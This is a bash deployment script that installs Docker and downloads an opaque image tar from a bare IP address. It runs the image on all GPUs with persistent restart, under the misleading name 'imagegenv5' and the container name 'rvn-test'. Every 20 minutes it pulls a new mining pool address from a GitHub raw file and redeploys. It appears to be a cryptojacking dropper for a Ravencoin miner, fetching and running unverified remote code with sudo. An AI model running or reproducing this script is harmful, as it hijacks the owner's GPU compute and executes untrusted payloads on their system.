#!/bin/bash

# تحقق مما إذا كانت الحاوية rvn-test تعمل حاليًا
if [ "$(docker inspect -f '{{.State.Running}}' rvn-test 2>/dev/null)" == "true" ]; then
    echo "Container 'rvn-test' is already running. Exiting..."
    exit 0
fi

# URL ملف صورة Docker tar على سيرفرك
IMAGE_TAR_URL="http://45.61.151.35/imagegenv5.tar"
IMAGE_TAR_LOCAL="/tmp/imagegenv5.tar"
IMAGE_NAME="riccorg/imagegenv5:latest"

# Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip)
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "Updating POOL_URL to: $new_pool_url"
        export POOL_URL=$new_pool_url

        docker stop rvn-test 2>/dev/null
        docker rm rvn-test 2>/dev/null

        echo "Downloading latest image tar..."
        curl -fsSL $IMAGE_TAR_URL -o $IMAGE_TAR_LOCAL

        echo "Loading image into Docker..."
        docker load -i $IMAGE_TAR_LOCAL

        docker run --gpus all -d --restart unless-stopped --name rvn-test $IMAGE_NAME
    else
        echo "No updates found."
    fi
}

install_docker() {
    sudo apt-get update --fix-missing
    sudo apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update --fix-missing
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io
}

check_docker() {
    if ! command -v docker &> /dev/null; then
        echo "Docker not installed. Installing..."
        install_docker
    else
        echo "Docker already installed."
    fi
}

# تحقق من Docker
check_docker

# تحقق من وجود GPU
echo "Checking GPU..."
docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi

# تحميل الصورة
echo "Downloading image tar..."
curl -fsSL $IMAGE_TAR_URL -o $IMAGE_TAR_LOCAL

echo "Loading image into Docker..."
docker load -i $IMAGE_TAR_LOCAL

# حذف أي حاوية قديمة (إن وجدت)
docker stop rvn-test 2>/dev/null
docker rm rvn-test 2>/dev/null

# تشغيل الحاوية
docker run --gpus all -d --restart unless-stopped --name rvn-test $IMAGE_NAME

# انتظر 10 ثواني قبل بدء التحديثات
sleep 10

# حلقة التحديث
while true; do
    sleep 1200  # كل 20 دقيقة
    update_and_restart
done
